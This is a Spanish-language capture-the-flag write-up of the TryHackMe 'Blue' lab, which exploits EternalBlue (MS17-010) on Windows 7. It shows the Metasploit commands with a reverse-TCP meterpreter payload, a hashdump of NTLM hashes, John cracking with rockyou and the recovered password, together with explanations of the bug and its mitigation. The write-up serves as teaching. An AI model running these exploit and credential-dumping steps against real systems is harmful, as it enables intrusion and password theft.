---
title: Blue — TryHackMe Write-up
date: 2026-03-31 18:00:00 +0100
categories:
  - Write-ups
  - TryHackMe
tags:
  - windows
  - smb
  - eternalblue
  - metasploit
  - ntlm
  - beginner
description: Explotación de MS17-010 (EternalBlue) sobre Windows 7 con Metasploit. Sesión meterpreter directa como SYSTEM, volcado de hashes NTLM y crackeo con John.
pin: false
math: false
mermaid: false
share: true
---

Blue es la sala "presentación" de Windows en TryHackMe y la gracia es que toca **EternalBlue** (MS17-010 / CVE-2017-0144), una de las vulnerabilidades más famosas de la última década — la que se usó en WannaCry y NotPetya en 2017, dejando colgados hospitales, ferrocarriles y multinacionales enteras en cuestión de horas. Hacer esta sala es básicamente revivir el bug que rompió medio internet.

A nivel técnico es una máquina sencilla: enumeras, detectas la vulnerabilidad con un script de Nmap, lanzas el módulo de Metasploit, y caes directo como `NT AUTHORITY\SYSTEM` sin pasar por escalada de privilegios. La parte aprovechable está en entender **por qué** existe ese bug y cómo se ve en la práctica.

> **TL;DR**: Windows 7 SP1 con SMBv1 sin parchear → `nmap --script smb-vuln-ms17-010` lo confirma → módulo `ms17_010_eternalblue` de Metasploit → meterpreter como SYSTEM → `hashdump` → crack del NTLM de Jon con John y rockyou → tres flags.
{: .prompt-info }

## Información de la máquina

| Campo       | Valor                                |
| ----------- | ------------------------------------ |
| Plataforma  | TryHackMe                            |
| Dificultad  | Easy                                 |
| OS          | Windows 7 Professional SP1           |
| IP          | 10.129.160.127                       |
| Fecha       | 2026-03-31                           |

## Técnicas utilizadas

- Enumeración de puertos con `nmap`
- Detección de vulnerabilidad SMB con scripts NSE de Nmap
- Explotación de MS17-010 (EternalBlue) con Metasploit
- Volcado de hashes NTLM con `hashdump` desde meterpreter
- Crackeo de hash NTLM con `john --format=NT`

## Enumeración

### Nmap

```bash
nmap -sC -sV -p- 10.129.160.127 -T4 -oA nmap
```

Puertos relevantes encontrados:

- `135/tcp` — msrpc
- `139/tcp` — netbios-ssn
- `445/tcp` — microsoft-ds (SMB)
- `3389/tcp` — ms-wbt-server (RDP)

El sistema operativo detectado fue **Windows 7 Professional SP1**. Con esa combinación (Win7 + SP1 + SMB expuesto sin parchear) ya hay olor a EternalBlue, pero hay que confirmarlo.

### Detección de la vulnerabilidad SMB

Nmap tiene un script NSE específico para detectar MS17-010 sin explotarlo:

```bash
nmap -p 445 --script smb-vuln-ms17-010 10.129.160.127
```

Output relevante:

```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     Risk factor: HIGH
```

Confirmado. La máquina es vulnerable a **MS17-010 (EternalBlue)**.

> Los scripts de la categoría `vuln` de Nmap son útiles para hacer un primer barrido, pero ojo: son ruidosos (mandan paquetes que tocan la vulnerabilidad para verificarla) y a veces dan falsos positivos/negativos. En entornos reales conviene combinarlos con otras señales antes de lanzar el exploit.
{: .prompt-tip }

## Explotación — EternalBlue con Metasploit

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.129.160.127
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <TUN0_IP>
run
```

Se obtuvo sesión de **meterpreter directamente como `NT AUTHORITY\SYSTEM`**, sin necesidad de pasar por escalada de privilegios ni ejecutar `getsystem`.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> EternalBlue cae directo como SYSTEM porque la vulnerabilidad está en el propio driver de SMBv1 del kernel (`srv.sys`), que se ejecuta en kernel-mode. El payload se inyecta en un proceso que ya tiene privilegios máximos del sistema. No es que escalemos: es que entramos por la puerta de servicio del kernel.
{: .prompt-info }

## Post-explotación

### Volcado de hashes con hashdump

```bash
meterpreter > hashdump
```

Output:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Usuario no predeterminado encontrado: **Jon**.  
Hash NTLM de Jon: `ffb43f0de35be4d9917ac0cc8ad57f8d`

El formato de cada línea es `usuario:RID:LM_hash:NTLM_hash:::`. El `aad3b435b51404eeaad3b435b51404ee` es el LM hash "vacío" (deshabilitado en Vista+), así que lo que importa es la cuarta columna: el NTLM.

### Crackeo del hash NTLM

```bash
echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > hash.txt
john --format=NT --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt

# Ver la contraseña crackeada
john --format=NT --show hash.txt
```

Contraseña obtenida: **`alqfna22`**

## Flags

| Flag    | Ubicación                                     |
| ------- | --------------------------------------------- |
| Flag 1  | `C:\flag1.txt`                                |
| Flag 2  | `C:\Windows\System32\config\flag2.txt`        |
| Flag 3  | `C:\Users\Jon\Documents\flag3.txt`            |

```bash
meterpreter > cat C:\\flag1.txt
meterpreter > cat C:\\Windows\\System32\\config\\flag2.txt
meterpreter > cat C:\\Users\\Jon\\Documents\\flag3.txt
```

> Windows Defender puede eliminar las flags de la máquina ocasionalmente. Si alguna no aparece donde debería, hay que reiniciar la VM desde la interfaz de TryHackMe y volver a lanzar el exploit. Es típico de esta sala.
{: .prompt-warning }

## Comandos meterpreter utilizados

| Comando            | Función                              |
| ------------------ | ------------------------------------ |
| `getuid`           | Ver usuario actual de la sesión      |
| `getsystem`        | Intentar escalar a SYSTEM            |
| `hashdump`         | Volcar hashes de cuentas locales     |
| `cat <ruta>`       | Leer un archivo                      |
| `search -f nombre` | Buscar archivos por nombre           |
| `shell`            | Abrir una shell `cmd.exe` interactiva |

## Sobre la vulnerabilidad — MS17-010 EternalBlue

- **CVE**: CVE-2017-0144 (parte del set de CVEs filtrados por Shadow Brokers desde la NSA)
- **Servicio afectado**: SMBv1 (puerto 445/tcp)
- **Sistemas vulnerables**: Windows 7, Windows Server 2008 R2 y anteriores sin el parche KB4012212 (publicado en marzo de 2017)
- **Por qué funciona**: el driver de SMBv1 maneja mal la fragmentación de paquetes `Trans2`. Un atacante puede mandar una secuencia de paquetes especialmente construida que provoca un buffer overflow en kernel-mode y ejecuta código arbitrario directamente como SYSTEM, sin autenticación
- **Cómo se detecta**: `nmap --script smb-vuln-ms17-010 <IP>`
- **Cómo se explota**: módulo `exploit/windows/smb/ms17_010_eternalblue` en Metasploit, o exploits standalone disponibles desde 2017
- **Impacto histórico**: la base técnica de WannaCry (mayo 2017) y NotPetya (junio 2017), que causaron daños valorados en miles de millones de dólares globalmente
- **Mitigación**: parchear KB4012212 o, si no se puede parchear, deshabilitar SMBv1 directamente (que es lo que Microsoft recomienda desde 2017 para cualquier sistema)

## Lecciones aprendidas

- MS17-010 afecta a SMBv1 en Windows 7 y Server 2008 R2 sin el parche KB4012212. Si veo esa combinación en una máquina, el escaneo de vulnerabilidades con Nmap NSE es lo primero
- `hashdump` solo funciona desde meterpreter, no en una shell `cmd` normal. Si tienes una shell cmd y necesitas hashes, primero hay que pivotar a meterpreter o usar otra técnica (Mimikatz, secretsdump.py, etc.)
- Los hashes NTLM se crackean con `john --format=NT` o `hashcat -m 1000`. El `aad3b435b51404eeaad3b435b51404ee` que aparece como LM hash es el LM "vacío", indica que LM está deshabilitado — no intentes crackearlo
- John guarda los resultados en una sesión persistente. Si ya crackeaste un hash y olvidaste la contraseña, `john --show` la recupera sin tener que volver a atacar
- Las rutas de Windows en meterpreter requieren doble backslash (`C:\\Users\\`) para escapar el carácter
- EternalBlue es una de las pocas vulnerabilidades donde el RCE inicial ya da SYSTEM. Lo normal en pentesting es entrar como usuario sin privilegios y tener que escalar — aquí te ahorras todo eso porque el bug está en el kernel

## Reflexión

Es la sala más "histórica" que se puede tocar en TryHackMe. Más allá de la práctica técnica, la moraleja real es que en mayo de 2017, dos meses después de que Microsoft publicara el parche, había aún cientos de miles de sistemas en internet sin parchear. WannaCry no fue una vulnerabilidad 0-day: fue mantenimiento ignorado. Para alguien que viene de IT corporativo y empieza en ciber, ese punto es más útil que el comando `set RHOSTS`.

## Referencias

- [HackTricks — Pentesting SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)
- [Rapid7 — Módulo MS17-010 EternalBlue](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)
- [Microsoft Security Bulletin MS17-010](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [TryHackMe — Blue](https://tryhackme.com/room/blue)